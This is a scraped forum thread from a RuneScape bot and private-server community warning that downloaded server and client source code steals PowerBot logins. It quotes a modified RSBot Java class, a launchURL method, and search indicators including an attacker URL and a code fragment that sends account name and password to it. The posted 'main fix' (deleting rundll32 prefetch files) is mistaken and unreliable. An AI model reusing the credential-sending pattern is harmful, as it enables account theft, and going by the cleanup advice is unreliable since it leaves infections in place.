    <description>Staff: I believe this is important to double post here, so moderate at your discretion.

[quote=&quot;pure2ownage&quot;]GUISE I HAS A WARNENING TO:
Powerbot has 2 ways of saving your information: 1) the accounts you have added
2) UID.TXT, This saves your encrypted data even if you don&#39;t add your accounts to log back in if you&#39;re logged out. PROTIP: SINCE THE BOT IS OPEN-SOURCE DECRYPTING IS EASY AS SHIT.
Path, Windows: C:\Users\XXX\Documents\RSBot\Settings\uid.txt
DELETE IT [B]BUT[/B] IT WILL COME BACK UNLESS YOU MODIFY YOUR CLIENT.  If necesary use a modified bot client which doesn&#39;t save your data there; I personally use my own client which doesn&#39;t save shit there.

Download the RSBot source using their SVN checkout and navigate to the file: [i]/trunk/src/org/rsbot/util\[b]UIDData.java[/b][/i]
Replace it with the following or manually disable the part which saves your data; deleting the file is not an option.
[code=Java]package org.rsbot.util;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.util.HashMap;
import java.util.Iterator;

public class UIDData
{
	private static String newline = System.getProperty(&quot;line.separator&quot;);
	private static String separator = &quot;#&quot;;

	private HashMap&lt;String, byte[]&gt; uids = new HashMap&lt;String, byte[]&gt;();
	private String lastUsed = &quot;&quot;;

	public UIDData()
	{
		File fUIDs = new File(GlobalConfiguration.Paths.getUIDsFile());
		if(!fUIDs.exists())
			return;

		try
		{
			final BufferedReader in = new BufferedReader(new FileReader(fUIDs));
			String line;// Used to store the lines from the file
			while ((line = in.readLine()) != null) {
				if (line.isEmpty())
					continue;

				String[] data = line.split(separator, 2);
				uids.put(&quot;Purebot&quot;, &quot; Wins&quot;.getBytes()); //the line, i replaced &#39;data[0]&#39; and &#39;data[1]&#39; with Purebot Wins, this text will now be in the uid.txt file for every account you use
			}
		}
		catch(Exception e) { }
	}

	public String getLastUsed()
	{
		return this.lastUsed;
	}

	public byte[] getUID(String name)
	{
		if(name.equals(&quot;&quot;))
			name = &quot;DEFAULT&quot;;

		lastUsed = name;

		byte[] data = uids.get(name);
		if(data == null)
			return new byte[0];

		return data;
	}

	public void setUID(String name, byte[] uid)
	{
		if(name.equals(&quot;&quot;))
			name = &quot;DEFAULT&quot;;

		uids.put(name, uid);
	}

	public void save()
	{
		try{
			File fUIDs = new File(GlobalConfiguration.Paths.getUIDsFile());
			if(!fUIDs.exists())
				fUIDs.createNewFile();

			final FileOutputStream out = new FileOutputStream(fUIDs);
			for(Iterator&lt;String&gt; it = uids.keySet().iterator(); it.hasNext(); )
			{
				String key = it.next();

				out.write(key.getBytes());
				out.write(separator.getBytes());
				out.write(uids.get(key));

				out.write(newline.getBytes());
			}

			out.close();
		}catch(Exception e){ }
	}

[quote=&quot;Andrew Ferguson&quot;]Let me just say this, even if you think you have no way of this happening to you make sure you scan your computer for these files. I was almost certain that nothing like this would ever happen to me cause I am very safe about what I download, but now I sit here with an account with 100gp that use to have a few million. So whats it going to be, 5 mins to search for this or 5 months to repair the damages it will cause?[/quote]

[b][color=red][size=36pt]WARNING:[/size] Your RuneScape account could be in danger![/b]

I just got my account cleaned for around 6M worth of logs whilst at work today (first day of my new job...). Probably did me a favour as I can now concentrate on private servers.

Anyway, most of you probably have items of a much higher value than mine, which is why I am posting this warning. The warning is a mixture of PowerBot (as I know many of you use it) and code within class files inside possibly ANY server you download. It&#39;s now become apparent (although always possible, less common in the past) to check Java files before executing a server as it can contain malicious Java files, and this is becoming more common.

I&#39;ve attached the Z-FileSearch.jar for you to search a whole folder of Java files with ease, and I&#39;ll tell you what to search for:

First off, if you&#39;ve downloaded a PI server called Ambitionz Forever recently - you could be at risk. I found malicious code both in the server and the client folder.

[b][u]SERVER FOLDER[/b]
If you just copy the Z-FileSearcher and then CTRL + V paste it in to every sub-folder, you can check all the Java files in that one folder (not including any other folders in that one folder).

Go to (or check for this in any server you&#39;ve downloaded recently): src &gt; server &gt; util &gt; Streams.java (notice there is a Stream and Streams class). This is all malicious (Streams.java only) and providing you use PowerBot, grabs your username/email, password and bank PIN that you enter in to PowerBot and sends it to the hacker. So if you&#39;ve executed this server and logged in to RS via PB, you are at high risk.

First off, if you&#39;ve found this. Delete the server and client folder and then skip to the rundll part of the fix.

Secondly, if you haven&#39;t found this, it could be somewhere else.

[s]Now there is possibly a .dll file that the hacker uses to leech information (and I&#39;ll post how to delete it when I find it as I&#39;m writing this with my computer still compromised :o) hidden in your C:/ Drive.[s] In your Client class in the CLIENT FOLDER (but could be in any other Java file - so use the FileSearcher) there&#39;s this:

[code]
public void launchURL(String url) { 
		String osName = System.getProperty(&quot;os.name&quot;); 
		try { 
			if (osName.startsWith(&quot;Mac OS&quot;)) { 
				Class fileMgr = Class.forName(&quot;com.apple.eio.FileManager&quot;); 
				Method openURL = fileMgr.getDeclaredMethod(&quot;openURL&quot;, new Class[] {String.class}); 
				openURL.invoke(null, new Object[] {url});
			} else if (osName.startsWith(&quot;Windows&quot;)) 
				Runtime.getRuntime().exec(&quot;rundll32 url.dll,FileProtocolHandler &quot; + url); 
			else { //assume Unix or Linux
				String[] browsers = { &quot;firefox&quot;, &quot;opera&quot;, &quot;konqueror&quot;, &quot;epiphany&quot;, &quot;mozilla&quot;, &quot;netscape&quot;, &quot;safari&quot; }; 
			String browser = null; 
			for (int count = 0; count &lt; browsers.length &amp;&amp; browser == null; count++) 
				if (Runtime.getRuntime().exec(new String[] {&quot;which&quot;, browsers[count]}).waitFor() == 0)
					browser = browsers[count]; 
			if (browser == null) {
				 throw new Exception(&quot;Could not find web browser&quot;); 
			} else
				 Runtime.getRuntime().exec(new String[] {browser, url});
			}
		} catch (Exception e) { 
			pushMessage(&quot;Failed to open URL.&quot;, 0, &quot;&quot;);
		}
	}
[/code]
But more importantly this:

[code]
Runtime.getRuntime().exec(&quot;rundll32 url.dll,FileProtocolHandler &quot; + url);
[/code]


[b][color=red][size=36pt]THE MAIN FIX[/size][/b]
Do a search on your hard drive for &quot;rundll&quot; (Start &gt; Search) and you may get this:

[URL=http://img140.imageshack.us/i/prefetch.png/][IMG]http://img140.imageshack.us/img140/3797/prefetch.png[/img][/URL]

Notice the files I emphasised in red. They were last modified today, yesterday and a few days ago. Considering this and fact that the file name has .EXE AND it&#39;s in the prefetch cache, I&#39;m dubbing these malicious [s]BUT please do not go deleting dlls until I confirm these to be malicious, I don&#39;t want to be deleting the wrong ones. Editing soon...[/s] Go to your C:/ Drive (or any other drive you use/have) and go to:

WINDOWS &gt; Prefetch. 

Now, it&#39;s safe to delete the files from this folder as it&#39;s just a cache to load your previously opened applications much faster. If you have the rundll32.EXE.pf files, make sure to DELETE THESE IMMEDIATELY AND THEN EMPTY YOUR RECYCLE BIN. You may as well delete every file (CTRL + A &gt; Delete &gt; Enter) incase you miss one.

Now, regarding your client and/or server, if you want to go though every file and delete the malicious code, please do so, but if you miss something you&#39;ll be back to square one and be at major risk of being hacked. I suggest deleting these folders and reporting the poster immediately.

After this, run a clean-up on your computer (including Cookies and Temporary Internet Files) and then do a search on your hard drive again for &quot;rundll&quot;. If you find nothing, I believe you are nearly safe, just one more thing to do.

Log on to RuneScape.com and change your password, PIN and secure your account up. Changing your password on RuneScape.com should be the LAST thing you do! If you do it before deleting the rundll&#39;s, you&#39;re still compromised and just risk giving the hacker your new password. Any questions? Just ask.
[b][size=36pt][color=red]END OF MAIN FIX[/size][/b]

I wanted to get the information out as soon as possible.

Using your Z-FileSearcher, search for pieces of code that contain:

[ul][li]http://[Don&#39;tClickThisFuckingLink]runescapes.megabyet.net/rsbot.php[/li]
[li]public static void checkStartup(String addr) {[/li]
[li]URL url = new URL(addr + &quot;?name=&quot; + account + &quot;&amp;pass=&quot; + password +[/li]
[li]url.openConnection()[/li][/ul]

I found these mostly in the Server class, but check EVERYWHERE!

If not just search &quot;url&quot;, &quot;pass&quot;, &quot;bot&quot; and &quot;checkstartup&quot; because this is what flagged them all up for me.

[b][u]CLIENT FOLDER[/b]
I found a file exactly the same as Streams.java called Class34.java, delete the whole thing if you&#39;re cleaning the source, otherwise you&#39;ll just delete the whole folder anyway.

Mainly in the Client class but could be anywhere, again use your Z-FileSearch to search for:

[ul][li]http://[Don&#39;tClickThisFuckingLink]runescapes.megabyet.net/rsbot.php[/li]
[li]public static void checkStartup(String addr) {[/li]
[li]URL url = new URL(addr + &quot;?name=&quot; + account + &quot;&amp;pass=&quot; + password +[/li]
[li]url.openConnection()[/li][/ul]

I found these mostly in the Client class, but check EVERYWHERE!

If not just search &quot;url&quot;, &quot;pass&quot;, &quot;bot&quot; and &quot;checkstartup&quot; because this is what flagged them all up for me.

I&#39;ll post this now and continue to investigate about the rundll&#39;s that I believe is the root cause of danger. Because even if you delete the folder the rundlls are still installed, therefore still feeding information to the hacker.

I believe this should be posted in the Download section too, as not everyone checks here. I believe this is quite important. This is not just Ambitionz Forever [PI], this could be in any server or client you download.

If you need any help or information, please post.

Also, I must stress, this is not a hack by PowerBot.org, so you are still safe to cotinue using PB. I must URGE you to proceed with these checks everytime you download a server - JUST INCASE! It&#39;s so discreet.

Sorry about the messy post, I was typing up and posting the updates as I found them and then MoparScape.org had some downtime so couldn&#39;t complete the post in time.

Very well, but the whole point of this topic is because of the code in the clients and servers. Whether it came from HF or RSBot originally, what I am trying to say is some people keep putting forward that the malicious code is in RSBot.Jar, which in this case that I’m explaining it is not.</p>

<p>It’s the users fault if they download a server, or client, that has some malicious code inside. Everyone that downloads a server off of any RuneScape Private Server forums, should know the risk they are taking. If the user is not smart enough to check through the core java files that a virus or malicious code could be built inside of, than that is the user(s) fault.</p>
<p>People need to know the risk they are taking. There has been way to many people posting ways to avoid a virus and what not, frankly is the people are too stupid to read over the regulations that each person post(s), that is - like I said - the users own fault.</p>
